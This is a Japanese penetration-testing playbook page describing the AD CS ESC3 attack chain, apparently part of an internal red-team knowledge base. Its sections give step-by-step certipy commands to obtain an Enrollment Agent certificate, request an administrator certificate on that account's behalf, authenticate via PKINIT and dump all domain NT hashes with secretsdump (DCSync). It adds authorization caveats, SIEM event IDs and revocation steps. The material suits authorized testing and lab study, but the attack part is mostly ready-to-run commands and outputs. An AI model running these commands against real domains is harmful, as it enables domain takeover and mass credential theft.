# ESC3 — Enrollment Agent テンプレートチェーン

> **スコープ**: 2 テンプレートの組み合わせ（Enrollment Agent 証明書取得 → 代理申請）で任意ユーザー名の証明書を発行し PKINIT → DCSync まで扱う。ESC1 が使えない環境（`Enrollee Supplies Subject: False`）でも有効。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（代理申請した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。演習環境では制約なし。

## 着火条件

以下の **2 テンプレートの組み合わせ** が揃ったときに実施する：

**条件A（Enrollment Agent テンプレート）:** `Enrollment Agent: True` / `Requires Manager Approval: False` / `Authorized Signatures Required: 0` / 低権限グループの Enrollment 権限

**条件B（代理申請先テンプレート）:** `Client Authentication: True` / `Authorized Signatures Required: 1` 以上（Enrollment Agent 証明書による署名が必要）/ `Application Policies` に `Certificate Request Agent` が含まれる

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `certipy`（`pip install certipy-ad --break-system-packages`）
- 必要な権限: 条件A テンプレートへの Enrollment 権限を持つドメインユーザー（低権限ユーザーで可）

## 先に確認すること

**攻撃者の思考トレース:** Enrollment Agent は「他ユーザーの代わりに証明書を申請できる」特権証明書。通常はヘルプデスクやスマートカード管理者に使われる。条件A で Enrollment Agent 証明書を取得し、条件B のテンプレートで管理者名で代理申請することで ESC1 と同等の成果が得られる。テンプレートの `Enrollee Supplies Subject` が False でも有効なため ESC1 が使えない環境でも刺さる。

---

## 1. 2 テンプレートの特定と確認

**コマンド:**

```bash
# [Attacker] 脆弱テンプレートの列挙（ESC3 は2テンプレートの組み合わせで表示）
certipy find -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -vulnerable -stdout
```

**観測される出力 → 次のアクション:**

| シグナル | 判断 |
|---------|------|
| 条件A・条件B の両方が ESC3 として表示 | §2 → §3 へ |
| 条件A のみ（条件B が見つからない）| ESC2 の Any Purpose 証明書が条件B を代替できる場合あり |
| 条件B の `Authorized Signatures Required: 0` | ESC3 ではなく ESC1 相当で直接申請できる可能性 |

---

## 2. Step 1: Enrollment Agent 証明書を取得（条件A テンプレート）

**事前準備（必須）:** `sudo ntpdate -u [DC_IP]` で時刻同期。

**コマンド:**

```bash
# [Attacker] Enrollment Agent 証明書を取得
certipy req \
  -ca [CA_NAME] -template [ENROLLMENT_AGENT_TEMPLATE] \
  -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP]
# → [USER].pfx が生成される（Enrollment Agent 証明書）
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Saved certificate ... to '[USER].pfx'` | Enrollment Agent 証明書取得成功 | §3 Step 2 へ |
| `ACCESS_DENIED` | Enrollment 権限がない | 別のユーザー / グループ追加（ACE_Abuse）で権限を取得してから再試行 |

---

## 3. Step 2: Enrollment Agent 証明書で管理者証明書を代理申請（条件B テンプレート）

**コマンド:**

```bash
# [Attacker] Enrollment Agent 証明書を使って administrator の証明書を代理申請
certipy req \
  -ca [CA_NAME] -template [TARGET_TEMPLATE] \
  -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] \
  -on-behalf-of [DOMAIN]\administrator \
  -pfx [USER].pfx
# -on-behalf-of: 代理申請先のユーザー名（[DOMAIN]\[TARGET_USER] 形式）
# -pfx: Step 1 で取得した Enrollment Agent 証明書
# → administrator.pfx が生成される
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Saved certificate ... to 'administrator.pfx'` | 代理申請成功 | §4 PKINIT 認証へ |
| `CERTSRV_E_MISSING_REQUESTOR_SUBJECT` | `-on-behalf-of` の形式を確認（`[DOMAIN]\[USER]` 形式が必要）|
| `CERTSRV_E_SIGNATURE_KEY_LENGTH_MISMATCH` | 条件B の最小鍵長が条件A より長い。`-key-size 4096` 等で調整 |

---

## 4. Step 3: PKINIT 認証 → NT ハッシュ取得 → DCSync

**コマンド:**

```bash
# [Attacker] PKINIT 認証 → NT ハッシュ取得
certipy auth -pfx administrator.pfx -dc-ip [DC_IP]

# [Attacker] NT ハッシュで DCSync
impacket-secretsdump -just-dc-ntlm -no-pass -hashes :[NT_HASH] [DOMAIN]/administrator@[DC_IP]
```

---

## 5. 原状回復（必須）: 証明書の失効

**コマンド:**

```bash
# [Attacker] Step 1・Step 2 で取得した2枚の証明書を両方失効
certipy ca -ca [CA_NAME] -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -revoke [REQUEST_ID_STEP1]
certipy ca -ca [CA_NAME] -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -revoke [REQUEST_ID_STEP2]
```

**注意:** Step 1 と Step 2 の REQUEST_ID は別々に記録する（両方の証明書を失効する必要がある）。

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| 条件B テンプレートが見つからない | ESC2 の Any Purpose 証明書が条件B の代替になる場合がある |
| 両条件が揃っていない | ESC1 / ESC2 / ESC6 が使えるか再確認する |

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。Enrollment Agent 機能の悪用はドメイン全体への影響
- **想定されるSIEM/EDR検知**: Event ID 4886・4887（条件A・B の各証明書発行）/ 4768（TGT 要求）/ MDI「Enrollment Agent による疑わしい証明書申請」
- **業務影響リスク**: 証明書発行自体は業務影響なし
- **原状回復必須項目**: ✅ 条件A・条件B 双方の証明書を CA で失効 / ✅ pfx・NT ハッシュ・TGT の暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `Overview.md`
- 前：ESC2（Any Purpose 証明書が Enrollment Agent 代替になる）→ `ESC2.md`
- 後：PKINIT → NT ハッシュ取得 → DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
